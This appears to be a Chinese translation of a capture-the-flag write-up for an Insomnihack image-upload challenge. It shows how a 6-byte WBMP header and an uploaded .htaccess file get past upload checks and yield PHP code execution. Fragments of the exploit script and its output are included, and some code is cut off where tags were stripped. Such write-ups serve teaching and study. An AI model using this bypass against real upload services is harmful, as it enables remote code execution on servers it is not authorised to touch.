原文链接：
## 描述
你可以在这而上传你的l33t照片。[这里](http://35.246.234.136/)
* * *
## 题目
Insomnihack出的有一道不错的题目！
此题目包含一个文件上传服务，允许用户往专门创建的文件夹中上传图像。
通过检查源代码，我们可以找到HTML注释``，因此可以通过GET请求参数`source`查看题目代码。
以下是题目代码：
    Your files:";
    foreach(glob($userdir . "*") as $file) {
        echo "$file";
    }
    echo "";
    ?>
    Upload your pics!
## 确定题目意图
上面的脚本允许用户在目录`images/[20_random_bytes_in_hex]/[filename]`上传文件。
成功上传后，将显示文件位置，并允许用户访问其文件。
这里无法上传任意类型文件。实际上，必须遵守以下限制：
  * 上传的文件不能有PHP扩展名（`.php`，`.php3`，`.phar`，...）。
  * 上传的文件不能包含`
... 输出结果为：
    $ php solution.php && xxd truncated.wbmp
    Shortest file size : 6
    int(15)
    array(5) {
      [0]=>
      int(1200)
      [1]=>
      int(800)
      [2]=>
      int(15)
      [3]=>
      string(25) "width="1200" height="800""
      ["mime"]=>
      string(18) "image/vnd.wap.wbmp"
     }
    00000000: 0000 8930 8620                           ...0.
看起来定义一个有效的`.wbmp`文件只需要6个字节！我们可以假设宽度和高度在第3-第6字节存储。
通过hex editor，你可以修改这些字节来得到1337x1337的大小。最终尺寸为1337x1337的`.wbmp`图片长这样：
    $ xxd truncated.wbmp
    00000000: 0000 8a39 8a39                           ...9.9
* * *
在这个文件中，我们添加的任意数据都将被视为有效：
## 找到php代码执行方法
既然我们可以上传.htaccess文件，下一步就是找到代码执行得方式。由于`
    """)
    upload_content("..htaccess", HT_ACCESS)
    upload_content("shell.corb3nik", TARGET_FILE)
    upload_content("trigger.corb3nik", VALID_WBMP)
    response = requests.post(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.corb3nik")
    print(response.text)
... 运行之后：
    $ python solution.py
    99
    string(5) "works"
可以运行PHP代码了！